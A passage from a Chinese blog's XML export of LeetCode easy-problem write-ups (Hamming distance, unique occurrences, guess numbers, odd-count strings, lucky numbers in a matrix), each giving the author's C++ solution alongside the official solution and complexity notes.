<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(1)$，在 Python 和 Java 中 Integer 的大小是固定的，处理时间也是固定的。 32 位整数需要 32 次迭代。</p>
</li>
<li><p>空间复杂度：$O(1)$，使用恒定大小的空间。</p>
</li>
</ul>
<p><strong>方法三：布赖恩·克尼根算法</strong></p>
<p><strong>思路</strong></p>
<p>方法二是逐位移动，逐位比较边缘位置是否为 1。寻找一种更快的方法找出等于 1 的位数。</p>
<p>是否可以像人类直观的计数比特为 1 的位数，跳过两个 1 之间的 0。例如：<code>10001000</code>。</p>
<p>上面例子中，遇到最右边的 1 后，如果可以跳过中间的 0，直接跳到下一个 1，效率会高很多。</p>
<p>这是布赖恩·克尼根位计数算法的基本思想。该算法使用特定比特位和算术运算移除等于 1 的最右比特位。</p>
<p>当我们在 <code>number</code> 和 <code>number-1</code> 上做 AND 位运算时，原数字 <code>number</code> 的最右边等于 1 的比特会被移除。</p>
<p><img src="/2020/11/10/%E6%B1%89%E6%98%8E%E8%B7%9D%E7%A6%BB/461_brian.png" alt="img"></p>
<p>基于以上思路，通过 2 次迭代就可以知道 <code>10001000</code> 中 1 的位数，而不需要 8 次。</p>
<p><strong>python代码：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hammingDistance</span>(<span class="params">self, x, y</span>):</span></span><br><span class="line">        xor = x ^ y</span><br><span class="line">        distance = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> xor:</span><br><span class="line">            distance += <span class="number">1</span></span><br><span class="line">            <span class="comment"># remove the rightmost bit of &#x27;1&#x27;</span></span><br><span class="line">            xor = xor &amp; (xor - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> distance</span><br></pre></td></tr></table></figure>
<p>注意：该算法发布在 1988 年 《C 语言编程第二版》的练习中（由 <strong>Brian W. Kernighan</strong> 和 Dennis M. Ritchie 编写），但是 Donald Knuth 在 2006 年 4 月 19 日指出，该方法第一次是由 Peter Wegner 在 1960 年的 CACM3 上出版。顺便说一句，可以在上述书籍中找到更多位操作的技巧。</p>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(1)$。</p>
<ul>
<li>与移位方法相似，由于整数的位数恒定，因此具有恒定的时间复杂度。</li>
</ul>
</li>
</ul>
<ul>
<li>但是该方法需要的迭代操作更少。</li>
</ul>
<ul>
<li>空间复杂度：$O(1)$，与输入无关，使用恒定大小的空间。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解怎么都是python或者java代码，虽然python和java我都会，但是我现在在学c++，还是全部用c++实现吧，可以借鉴官方题解的算法思想😗</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>独一无二的出现次数</title>
    <url>/2020/11/23/%E7%8B%AC%E4%B8%80%E6%97%A0%E4%BA%8C%E7%9A%84%E5%87%BA%E7%8E%B0%E6%AC%A1%E6%95%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/unique-number-of-occurrences/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个整数数组 <code>arr</code>，请你帮忙统计数组中每个数的出现次数。</p>
<p>如果每个数的出现次数都是独一无二的，就返回 <code>true</code>；否则返回 <code>false</code>。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [1,2,2,1,1,3]</span><br><span class="line">输出：true</span><br><span class="line">解释：在该数组中，1 出现了 3 次，2 出现了 2 次，3 只出现了 1 次。没有两个数的出现次数相同。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [1,2]</span><br><span class="line">输出：false</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [-3,0,1,-3,1,1,1,-3,10,0]</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= arr.length &lt;= 1000</code></li>
<li><code>-1000 &lt;= arr[i] &lt;= 1000</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>使用计数法，定义一个大小为2000的数组tmp，遍历整数数组arr，每个元素i出现的次数传到数组tmp中的下标索引i处。接下来只需要判断数组tmp中是否有重复的元素，遍历数组tmp对每个大于0的元素值和索引存储到map容器中，值作为键，索引作为map的值，利用map容器键相同值覆盖的特性，只要tmp中元素值有相同的，map容器中的元素个数一定会和tmp中大于0的元素个数不相同。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败90.69%，内存消耗8.8M，击败6.72%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">uniqueOccurrences</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">tmp</span><span class="params">(<span class="number">2000</span>,<span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i:arr)&#123;</span><br><span class="line">            ++tmp[<span class="number">1000</span>+i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> tmp2=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; m;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">2000</span>;++j)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tmp[j]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                m[tmp[j]]=j;</span><br><span class="line">                ++tmp2;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> tmp2==m.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/unique-number-of-occurrences/solution/du-yi-wu-er-de-chu-xian-ci-shu-by-leetcode-solutio/">官方题解</a>:</h6><p><strong>方法一：哈希表</strong></p>
<p>首先使用哈希表记录每个数字的出现次数；随后再利用新的哈希表，统计不同的出现次数的数目。如果不同的出现次数的数目等于不同数字的数目，则返回 $\textit{true}$，否则返回 $\textit{false}$。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败90.69%，内存消耗8.5M，击败50.19%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">uniqueOccurrences</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; occur;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; x: arr) &#123;</span><br><span class="line">            occur[x]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">unordered_set</span>&lt;<span class="keyword">int</span>&gt; times;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; x: occur) &#123;</span><br><span class="line">            times.insert(x.second);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> times.size() == occur.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(N)$，其中 $N$ 为数组的长度。遍历原始数组需要 $O(N)$时间，而遍历中间过程产生的哈希表又需要 $O(N)$ 的时间。</p>
</li>
<li><p>空间复杂度：$O(N)$。</p>
</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解和我的思路一样，不过表达的比我清楚（我也会越来越好的），stl容器用的也比我6（嘘！我会回悄悄地野蛮生长🙂），代码写的比我的简洁。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>猜数字</title>
    <url>/2020/11/05/%E7%8C%9C%E6%95%B0%E5%AD%97/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://leetcode-cn.com/problems/guess-numbers/"><strong>题目地址</strong></a></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>小A 和 小B 在玩猜数字。小B 每次从 1, 2, 3 中随机选择一个，小A 每次也从 1, 2, 3 中选择一个猜。他们一共进行三次这个游戏，请返回 小A 猜对了几次？</p>
<p>输入的<code>guess</code>数组为 小A 每次的猜测，<code>answer</code>数组为 小B 每次的选择。<code>guess</code>和<code>answer</code>的长度都等于3。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：guess &#x3D; [1,2,3], answer &#x3D; [1,2,3]</span><br><span class="line">输出：3</span><br><span class="line">解释：小A 每次都猜对了。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：guess &#x3D; [2,2,3], answer &#x3D; [3,2,1]</span><br><span class="line">输出：1</span><br><span class="line">解释：小A 只猜对了第二次。</span><br></pre></td></tr></table></figure>
<p><strong>限制：</strong></p>
<ol>
<li><code>guess</code>的长度 = 3</li>
<li><code>answer</code>的长度 = 3</li>
<li><code>guess</code>的元素取值为 <code>&#123;1, 2, 3&#125;</code> 之一。</li>
<li><code>answer</code>的元素取值为 <code>&#123;1, 2, 3&#125;</code> 之一。</li>
</ol>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>这应该是最简单的题了吧🤣，直接遍历判断两个容器值是否相等。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100%，内存消耗6.6M，击败5.03%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">game</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; guess, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; answer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(guess[i]==answer[i])&#123;</span><br><span class="line">                ++result;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>算是很简单的一道题了，没啥可总结的也没有官方题解，散会😐。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>生成每种字符都是奇数个的字符串</title>
    <url>/2020/11/19/%E7%94%9F%E6%88%90%E6%AF%8F%E7%A7%8D%E5%AD%97%E7%AC%A6%E9%83%BD%E6%98%AF%E5%A5%87%E6%95%B0%E4%B8%AA%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/generate-a-string-with-characters-that-have-odd-counts/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个整数 <code>n</code>，请你返回一个含 <code>n</code> 个字符的字符串，其中每种字符在该字符串中都恰好出现 <strong>奇数次</strong> 。</p>
<p>返回的字符串必须只含小写英文字母。如果存在多个满足题目要求的字符串，则返回其中任意一个即可。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 4</span><br><span class="line">输出：&quot;pppz&quot;</span><br><span class="line">解释：&quot;pppz&quot; 是一个满足题目要求的字符串，因为 &#39;p&#39; 出现 3 次，且 &#39;z&#39; 出现 1 次。当然，还有很多其他字符串也满足题目要求，比如：&quot;ohhh&quot; 和 &quot;love&quot;。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 2</span><br><span class="line">输出：&quot;xy&quot;</span><br><span class="line">解释：&quot;xy&quot; 是一个满足题目要求的字符串，因为 &#39;x&#39; 和 &#39;y&#39; 各出现 1 次。当然，还有很多其他字符串也满足题目要求，比如：&quot;ag&quot; 和 &quot;ur&quot;。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 7</span><br><span class="line">输出：&quot;holasss&quot;</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= n &lt;= 500</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>只用两个不同的字母组成字符串就可以满足要求，如果n是奇数，直接返回n个‘a’组成的字符串，如果n是偶数，则返回一个‘b’和n-1个’a‘组成的字符串。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.6M，击败14.23%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">generateTheString</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> result=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">//如果n是偶数，则添加一个‘b’</span></span><br><span class="line">        <span class="keyword">if</span>(n%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">            result+=<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">            --n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(n--)&#123;</span><br><span class="line">            <span class="comment">//n或n-1个‘a’</span></span><br><span class="line">            result+=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，题目很简单，so easy！</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>矩阵中的幸运数</title>
    <url>/2020/11/20/%E7%9F%A9%E9%98%B5%E4%B8%AD%E7%9A%84%E5%B9%B8%E8%BF%90%E6%95%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/lucky-numbers-in-a-matrix/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个 <code>m * n</code> 的矩阵，矩阵中的数字 <strong>各不相同</strong> 。请你按 <strong>任意</strong> 顺序返回矩阵中的所有幸运数。</p>
<p>幸运数是指矩阵中满足同时下列两个条件的元素：</p>
<ul>
<li>在同一行的所有元素中最小</li>
<li>在同一列的所有元素中最大</li>
</ul>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：matrix &#x3D; [[3,7,8],[9,11,13],[15,16,17]]</span><br><span class="line">输出：[15]</span><br><span class="line">解释：15 是唯一的幸运数，因为它是其所在行中的最小值，也是所在列中的最大值。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：matrix &#x3D; [[1,10,4,2],[9,3,8,7],[15,16,17,12]]</span><br><span class="line">输出：[12]</span><br><span class="line">解释：12 是唯一的幸运数，因为它是其所在行中的最小值，也是所在列中的最大值。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：matrix &#x3D; [[7,8],[1,2]]</span><br><span class="line">输出：[7]</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>m == mat.length</code></li>
<li><code>n == mat[i].length</code></li>
<li><code>1 &lt;= n, m &lt;= 50</code></li>
<li><code>1 &lt;= matrix[i][j] &lt;= 10^5</code></li>
<li>矩阵中的所有元素都是不同的</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>暴力解法：遍历每一行，求出当前行中的最小元素，然后判断这个元素是否是所在列中的最大值，如果是则是幸运数，否则不是幸运数。</p>
<p><strong>c++代码：</strong>(执行用时68ms，击败5.15%，内存消耗11.5M，击败17.44%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">luckyNumbers</span> <span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; matrix)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">int</span> m=matrix.size();</span><br><span class="line">        <span class="keyword">int</span> n=matrix[<span class="number">0</span>].size();</span><br><span class="line">        <span class="comment">//遍历每一行</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;++i)&#123;</span><br><span class="line">            <span class="comment">//求出每一行的最大值</span></span><br><span class="line">            <span class="keyword">int</span> row_min=INT_MAX;</span><br><span class="line">            <span class="comment">//每一行最小值的列索引</span></span><br><span class="line">            <span class="keyword">int</span> min_j=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(matrix[i][j]&lt;row_min)&#123;</span><br><span class="line">                    row_min=matrix[i][j];</span><br><span class="line">                    min_j=j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//判断当前行最小值是否是所在列最大的，即是否是幸运数</span></span><br><span class="line">            <span class="keyword">int</span> col_max=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;m;++k)&#123;</span><br><span class="line">                <span class="keyword">if</span>(row_min&lt;matrix[k][min_j])&#123;</span><br><span class="line">                    <span class="comment">//不是幸运数</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(k==m<span class="number">-1</span>)&#123;</span><br><span class="line">                    <span class="comment">//在当前列中最大，是幸运数</span></span><br><span class="line">                    result.push_back(row_min);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/lucky-numbers-in-a-matrix/solution/ju-zhen-zhong-de-xing-yun-shu-by-leetcode-solution/">官方题解</a>:</h6><p><strong>方法一： 模拟</strong></p>
<p>预处理出两个数组 <code>rMin</code> 和 <code>cMax</code>，其中 <code>rMin[i]</code> 表示第 $i$ 行中最小的元素，<code>cMax[j]</code> 表示第 $j$ 列中最大的元素。接着遍历矩阵 <code>matrix</code>，判断每个 <code>matrix[i][j]</code> 是否是这一行最小的并且是这一列最大的，具体方法是直接与 <code>rMin[i]</code> 和 <code>cMax[j]</code> 比较，如果都相等，就加入到答案的序列中。</p>
<p>思考：<code>rMin</code> 和 <code>cMax</code> <strong>是否可以存放「行最小值」和「列最大值」的索引？</strong> 答案是可以。但是如果原题中没有说明「矩阵中的数字 <strong>各不相同</strong>」就不能这么干，因为假设第 rr 行的「行最小值」出现两次，索引为 $c_1$ 和 $c_2$c ，却只保存了一个索引 $c_1$，$c_2$位置的这个数满足它是「列最大值」，这个时候就会判断出错。</p>
<p><strong>c++代码：</strong>(执行用时60ms，击败5.15%，内存消耗11.6M，击败7.41%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">luckyNumbers</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; matrix)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> r = matrix.size(), c = matrix[<span class="number">0</span>].size();</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">rMin</span><span class="params">(r, INT_MAX)</span></span>;</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">cMax</span><span class="params">(c, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; r; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; c; ++j) &#123;</span><br><span class="line">                rMin[i] = min(rMin[i], matrix[i][j]);</span><br><span class="line">                cMax[j] = max(cMax[j], matrix[i][j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; r; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; c; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (matrix[i][j] == rMin[i] &amp;&amp; matrix[i][j] == cMax[j]) &#123;</span><br><span class="line">                    ans.push_back(matrix[i][j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：预处理的时间代价是 $O(mn)$，统计答案的时间代价也是 $O(mn)$，故渐进时间复杂度为 $O(mn)$。</p>
</li>
<li><p>空间复杂度：这里用到了两个辅助数组 <code>rMin</code>​ 和 <code>cMax</code>​，长度分别为 $m$ 和 $n$，故渐进空间复杂度为 $O(m + n)$。</p>
</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>本来我觉得暴力模拟解法太low了，想看看题解有没有什么更好的方法，结果官方题解也是暴力模拟🤣，不过官方题解和我的还是有一些不一样，他是先求出每行的最小值和每列的最大值，我是求出每行的最小值后再去判断是否是该列的最大值，他是并列关系，我是递进关系，不过效率也都差不多😗。</p>
]]></content>
      <categories>
        <category>ACM</category>
